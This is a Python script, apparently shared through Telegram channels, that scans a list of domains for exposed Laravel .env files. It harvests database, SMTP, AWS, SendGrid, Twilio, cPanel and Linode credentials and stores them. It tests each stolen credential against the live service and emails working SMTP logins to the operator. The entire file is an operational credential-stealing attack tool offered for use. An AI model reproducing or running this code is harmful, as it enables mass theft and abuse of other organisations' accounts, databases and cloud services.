########################################################################
# This laravel .env extractor is free. but dont ever think to sell it. #
# You can custom whatever you want but dont remove the credit.         #
# Made by t.me/GrazzMean t.me/fiola_tools.                             #
########################################################################

"""
Features :
1. Auto check if smtp work or not and send it to you email
2. Auto check twilio account
3. Auto check db account if can connected or not
4. Auto check AWS
5. Auto check SENDGRID
"""

import requests
import random
import os
import re
import mysql.connector
import smtplib
import ssl
import sys
import boto3
import botocore.session
import socket
from twilio.rest import Client
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
init()
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

red = Fore.RED
reset = Fore.RESET
green = Fore.GREEN
yellow = Fore.YELLOW

def useragent() -> str:
    useragent = []
    try:
        if not useragent:
            agent = open('lib/user-agent.txt', 'r', encoding='utf8').read().splitlines()
            useragent.extend(agent)
        return random.choice(useragent)
    except: 
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0'
    

def error(url, msg):
    print(f"-| {url} --> [{red}{msg}{reset}]")

def succes(url, msg):
    print(f"-| {url} --> [{green}{msg}{reset}]")

def parse(url):
    if '://' not in url:
        url = 'http://'+url
    return urlparse(url)

def get_smtp(site, text):
    try:
        app_key = re.search(r'APP_KEY=base64:(.*?)=', text)
        if app_key:
            app_key = app_key[0]
            appkey = f"{green}APPKEY{reset}|"
            open('result/database/APPKEY.txt', 'a+', encoding='utf8').write(site+'\n'+app_key+'\n\n')
        else:
            appkey = f"{red}APPKEY{reset}|"
        db = re.search(r"DB_CONNECTION=(.*?)\nDB_HOST=(.*?)\nDB_PORT=(.*?)\nDB_DATABASE=(.*?)\nDB_USERNAME=(.*?)\nDB_PASSWORD=(.*?)\n", text)
        if db:
            db_info = f"{green}DB{reset}|"
            db_connection = db.group(1)
            db_host = db.group(2)
            db_port = db.group(3)
            db_database = db.group(4)
            db_username = db.group(5)
            db_password = db.group(6)
            with open('result/database/DB.txt', 'a+', encoding='utf8') as k:
                k.write(site+'\n')
                k.write("DB_CONNECTION:{}\n".format(db_connection))
                k.write("DB_HOST:{}\n".format(db_host))
                k.write("DB_PORT:{}\n".format(db_port))
                k.write("DB_DATABASE:{}\n".format(db_database))
                k.write("DB_USERNAME:{}\n".format(db_username))
                k.write("DB_PASSWORD:{}\n".format(db_password))
                k.write('\n')
            k.close()
            if db_host != 'localhost' or db_host != '127.0.0.1':
                db_conn = connect_db(site, db_host, db_port, db_database, db_username, db_password)
                if db_conn:
                    db_connect = f"{green}DB_CONNECT{reset}|"
                else:
                    db_connect = f""
            else:
                db_connect = f""
        else:
            db_connect = f""
            db_info = f"{red}DB{reset}|"
        smtp = re.search('MAIL_HOST=(.*?)\nMAIL_PORT=(.*?)\nMAIL_USERNAME=(.*?)\nMAIL_PASSWORD=(.+)', text)
        if smtp:
            if "MAIL_FROM" in text:
                mail_from = re.search('MAIL_FROM=([\w\.-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})', text)
                if mail_from:
                    mail_from = mail_from.group(1)
                else:
                    mail_from = "UNKNOWN"
            else:
                mail_from = "UNKNOWN"
            #smtp_color = f"{green}SMTP{reset}"
            mail_host = smtp.group(1)
            mail_port = smtp.group(2)
            mail_username = smtp.group(3)
            mail_password = smtp.group(4)
            with open('result/smtp/smtp.txt', 'a+', encoding='utf8') as j:
                j.write(f'{site}\n')
                j.write(f'MAIL_HOST:{mail_host}\n')
                j.write(f'MAIL_PORT:{mail_username}\n')
                j.write(f'MAIL_USERNAME:{mail_port}\n')
                j.write(f'MAIL_PASSWORD:{mail_password}\n')
                j.write(f'MAIL_FROM:{mail_from}\n')
                j.write('\n')
            j.close()
            open('result/smtp/format_smtp.txt', 'a+', encoding='utf8').write(f"{mail_host}|{mail_port}|{mail_username}|{mail_password}\n")
            if 'awsamazon.com' in mail_host:
                smtp_color = f"{green}AMAZON_SMTP{reset}|"
            elif 'sendgrid.net' in mail_host:
                smtp_color = f"{green}SENDGRID_SMTP{reset}|"
            else:
                smtp_color = f'{green}RANDOM_SMTP{reset}|'
            chk = check_smtp(mail_host, mail_port, mail_username, mail_password)
            if chk:
                smtp_res = f"{green}SMTP_WORK{reset}|"
            else:
                smtp_res = f""
        else:
            smtp_res = ''
            smtp_color = f"{red}SMTP{reset}|"
        if 'SENDGRID_API_KEY=' in text:
            sendgrid = re.search(r'^SENDGRID_API_KEY=(.*)$', text)
            if sendgrid:
                sendgrid = sendgrid.group(1)
                sg = f"{green}SENDGRID{reset}|"
                open('result/smtp/sendgrid.txt', 'a+', encoding='utf8').write(sendgrid+'\n')
                check_sendgrid = sendgrid_check_limit(sendgrid)
                if check_sendgrid:
                    sg_color = f"{green}SENDGRID_WORK{reset}|"
                else:
                    sg_color = ""
            else:
                sg_color = ""
                sg = f"{red}SENDGRID{reset}"
        else:
            sg_color = f""
            sg = f"{red}SENDGRID{reset}|"

        if 'AWS_ACCESS_KEY_ID=' in text:
            pattern = re.compile(r'AWS_[A-Z_]+=(\S+)')
            #aws_key = re.findall(r'AWS_ACCESS_KEY_ID=(.*?)\nAWS_SECRET_ACCESS_KEY=(.*?)\nAWS_DEFAULT_REGION=(.*?)', text)
            aws_key = pattern.findall(text)
            if aws_key:
                aws_color = f"{green}AWS{reset}|"
                aws_access_key = aws_key[0]
                aws_secret_key = aws_key[1]
                aws_region = aws_key[2]
                with open('result/smtp/aws.txt', 'a+', encoding='utf8') as f:
                    f.write('AWS_ACCESS_KEY_ID={}\n'.format(aws_access_key))
                    f.write('AWS_SECRET_ACCESS_KEY={}\n'.format(aws_secret_key))
                    f.write('AWS_DEFAULT_REGION={}\n\n'.format(aws_region))
                f.close()
                open('result/smtp/aws_format.txt', 'a+', encoding='utf8').write(f'{aws_access_key}|{aws_secret_key}|{aws_region}\n')
                checkaws = check_aws(aws_access_key, aws_secret_key, aws_region)
                if checkaws:
                    awskey = f"{green}AWS_WORK{reset}|"
                else:
                    awskey = ""
            else:
                awskey = ""
                aws_color = f"{red}AWS{reset}|"      
        else:
            aws_color = f"{red}AWS{reset}|"
        if 'TWILIO_ACCOUNT_SID=' in text:
            tw = re.findall(r'TWILIO_ACCOUNT_SID=(\w+)\nTWILIO_AUTH_TOKEN=(\w+)\nTWILIO_PHONE_NUMBER=(\+\d{10,})', text)
            if tw:
                twilio_color = f"{green}TWILIO{reset}|"
                sid = tw[0]
                token = tw[1]
                phone = tw[2]
                open('result/twilio.txt', 'a+', encoding='utf8').write(f'TWILIO_ACCOUNT_SID={sid}\nTWILIO_AUTH_TOKEN={token}\nTWILIO_PHONE_NUMBER={phone}\n\n')
                tw_check = twilio_check(sid, token, phone)
                if tw_check:
                    tw_work = f"{green}TWILIO_WORK{reset}|"
                else:
                    tw_work = ''
        else:
            tw_work = ''
            twilio_color = f"{red}TWILIO{reset}|"
        if 'CPANEL_USERNAME=' in text:
            cp = re.findall(r'CPANEL_USERNAME=(\S+)\nCPANEL_PASSWORD=(\S+)', text)
            if cp:
                cpanel = f'{green}CPANEL{reset}|'
                open('result/cpanel.txt', 'a+', encoding='utf8').write(f'{site}\nUSERNAME={cp[0]}\nPASSWORD={cp[1]}\n')
            else:
                cpanel = f'{red}CPANEL{reset}|'
        else:
            cpanel = f'{red}CPANEL{reset}|'
        
        if 'LINODE_API_KEY=' in text:
            linode = re.search(r'LINODE_API_KEY=(\S+)', text)
            if linode:
                ln = f'{green}LINODE{reset}'
                open('result/linode.txt', 'a+', encoding='utf8').write(f'{site}\nLINODE_API_KEY={ln[0]}\n')
                open('result/list_linode.txt', 'a+', encoding='utf8').write(f'{ln[0]}\n')
            else:
                ln = f'{red}LINODE{reset}'
        else:
            ln = f'{red}LINODE{reset}'
        print(f"-| {site} --> [{appkey}{db_info}{db_connect}{smtp_color}{smtp_res}{sg}{sg_color}{aws_color}{awskey}{twilio_color}{tw_work}{cpanel}{ln}]")

    except Exception as e: print(e)

def check_aws(user, password, region):
    
    try:
        session = boto3.Session(aws_access_key_id=user, aws_secret_access_key=password,region_name=region)

        cl = session.client('ses')
        get = cl.get_send_quota()
        max24hours = get['Max24HourSend']
        if max24hours:
            open('result/smtp/aws_work.txt', 'a+', encoding='utf8').write(f'AWS_ACCESS_KEY_ID={user}\nAWS_SECRET_ACCESS_KEY={password}\nREGION={region}\nMax24HourSend={max24hours}\n\n')
            return True
        return False
    except: return False


def twilio_check(sid, token, phone):
    try:
        client = Client(sid, token)
        acc = client.api.accounts(sid).fetch()
        balance = acc.balance
        open('result/twilio_work.txt', 'a+', encoding='utf8').write(f'SID : {sid}\nTOKEN : {token}\nPHONE : {phone}\nBALANCE : {balance}\n\n')
        return True
    except: return False

def sendgrid_check_limit(apikey):
    headers = {'User-Agent': useragent(), 'Authorization': f'Bearer {apikey}'}
    try:
        req = requests.get('https://api.sendgrid.com/v3/user/limits', headers=headers)
        if req.status_code == 200:
            getjson = req.json()
            perday = getjson['email']['daily']
            permonth = getjson['email']['monthly']
            gettotal = requests.get('https://api.sendgrid.com/v3/user/credits', headers=headers).json()
            limit = gettotal['total']
            used = gettotal['used']
            getfm = requests.get('https://api.sendgrid.com/v3/user/email', headers=headers).json()
            fm = getfm['email']
            with open('result/smtp/sendgrid_work.txt', 'a+', encoding='utf8') as f:
                f.write(f"apikey      : {apikey}\n")
                f.write(f"Limit       : {limit}\n")
                f.write(f"Used        : {used}\n")
                f.write(f"Per Day     : {perday}\n")
                f.write(f"Per month   : {permonth}\n")
                f.write(f"from email  : {fm}\n\n")
            f.close()
            return True
        else:    
            return False
        
    except: return False
    
def check_smtp(host, port, username, password) -> bool:
    subject = "[+] WORK EMAIL!"
    body = f"""
[+] -- WORK SMTP -- [+]
[+] Host     : {host}
[+] Email    : {username}
[+] Port     : {port}
[+] Passowrd : {password}
"""
    msg = MIMEMultipart()
    msg['From'] = username
    msg['To'] = toemail
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))
    context = ssl.create_default_context()
    try:
        server = smtplib.SMTP_SSL(host, port, context=context, timeout=10)
        server.login(username, password)
        server.sendmail(username, toemail, msg.as_string())
        server.quit()
        with open('result/smtp/work_smtp.txt', 'a+', encoding='utf8') as j:
            j.write(f'HOST      : {host}\n')
            j.write(f'Email     : {username}\n')
            j.write(f'Port      : {port}\n')
            j.write(f'Password  : {password}\n')
            j.write('\n')

        return True
    except: return False
    

def connect_db(site, host, port, database, username, password):
    try:
        connection = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        if connection.is_connected():
            connection.close()
            with open('result/database/DB_SUCCESS_CONNECT.txt', 'a+', encoding='utf8') as k:
                k.write(site+'\n')
                #k.write("DB_CONNECTION:{}\n".format(db_connection))
                k.write("DB_HOST:{}\n".format(host))
                k.write("DB_PORT:{}\n".format(port))
                k.write("DB_DATABASE:{}\n".format(database))
                k.write("DB_USERNAME:{}\n".format(username))
                k.write("DB_PASSWORD:{}\n".format(password))
                k.write('\n')
            k.close()
            return True
        return False
    
    except: return False
    

def env(url):
    uri = parse(url).scheme + '://' + parse(url).netloc
    try:
        headers = {'User-Agent': useragent()}
        for ph in path:
            if ph.startswith('/'):
                site = uri+ph
            else:
                site = uri+'/'+ph
            req = requests.get(site, headers=headers, verify=False, timeout=5, allow_redirects=False).text
            if 'APP_NAME' in req or 'MAIL_HOST' in req or 'DB_HOST' in req or 'APP_ENV' in req:
                succes(site, 'Laravel')
                open('result/laravel_site/laravel.txt', 'a+', encoding='utf8').write(site+'\n')
                try:
                    ip = socket.gethostbyname(parse(url).netloc)
                    open('result/laravel_ip.txt', 'a+', encoding='utf8').write(ip+'\n')
                except: 
                    pass
                print(site)
                get_smtp(site, req)
            else:
                error(site, 'Laravel')

    except requests.exceptions.Timeout: error(site, 'Timeout')
    except: error(site, 'Error')

def create_folder():
    path = ['result', 'result/database', 'result/smtp', 'result/laravel_site']
    for x in path:
        if not os.path.exists(x):
            os.makedirs(x)

def main():
    global path, toemail
    path = ['/.env']
    banner = f"""
\t\t{yellow}Laravel Extracktor{reset}
\t\t[CHANNEL] {red}@fiola_tools{reset}
"""
    try:
        create_folder()
        print(banner)
        try:
            path = open('path.txt', 'r', encoding='utf8').read().splitlines()
        except FileNotFoundError:
            path = ['/.env']
        try: email = open('email.txt', 'r', encoding='utf8').read(); toemail = re.search(r"[\w.+-]+@[\w-]+\.[\w.-]+", email).group(0)
        except FileNotFoundError: print(f"{red}ERROR{reset}: email.txt not found"); sys.exit()
        domain = list(dict.fromkeys(open(input("- Domain List : "), encoding='utf8').read().splitlines()))
        thread = int(input("- Thread : "))
        with ThreadPoolExecutor(max_workers=thread) as j:
            j.map(env, domain)


    except FileNotFoundError: print("ERROR: File Not Found.")
    #except Exception as e: print(f"ERROR: {e}")
    except Exception as e: print(e)

main()

